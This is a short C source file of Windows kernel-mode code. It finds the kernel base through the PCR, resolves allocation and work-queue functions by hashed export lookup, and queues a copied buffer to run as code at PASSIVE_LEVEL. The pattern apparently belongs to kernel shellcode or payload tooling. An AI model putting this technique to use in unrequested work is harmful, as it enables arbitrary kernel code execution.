
#include "common.h"

/*!
 *
 * @brief	Checks if the current IRQL is at PASSSIVE_LEVEL.
 * 		If it is not, it creates an kernel work item,
 * 		and queue's it to be executed as PASSIVE_LEVEL.
 *
 * @param	None.
 *
!*/
KMFUNC BOOL WINAPI IrqlLowerIrql( IN PVOID Ptr, IN ULONG Len )
{
	PVOID            ntp;
	PVOID            mem;
	PWORK_QUEUE_ITEM itm;
	KM_API           api;

	ntp = PcrNtPointer();

	if ( ntp )
	{
		api.ExFreePool       = PeGetFuncEat( ntp, H_EXFREEPOOL );
		api.ExAllocatePool   = PeGetFuncEat( ntp, H_EXALLOCATEPOOL );
		api.ExQueueWorkItem  = PeGetFuncEat( ntp, H_EXQUEUEWORKITEM );
		api.KeGetCurrentIrql = PeGetFuncEat( ntp, H_KEGETCURRENTIRQL ); 

		if ( api.ExQueueWorkItem && api.ExAllocatePool && api.KeGetCurrentIrql )
		{
			if ( api.KeGetCurrentIrql() != PASSIVE_LEVEL )
			{
				itm = api.ExAllocatePool( NonPagedPool, sizeof(WORK_QUEUE_ITEM) );
				mem = api.ExAllocatePool( NonPagedPool, Len );

				if ( mem && itm )
				{
					__builtin_memset( itm,'\0', sizeof(WORK_QUEUE_ITEM) );
					__builtin_memcpy( mem, Ptr, Len );

					itm->Routine = CPTR( mem );

					api.ExQueueWorkItem( itm, DelayedWorkQueue );

					return TRUE;
				};

				if ( mem )
					api.ExFreePool( mem );

				if ( itm )
					api.ExFreePool( itm );
			};
		};
	};

	return FALSE;
};
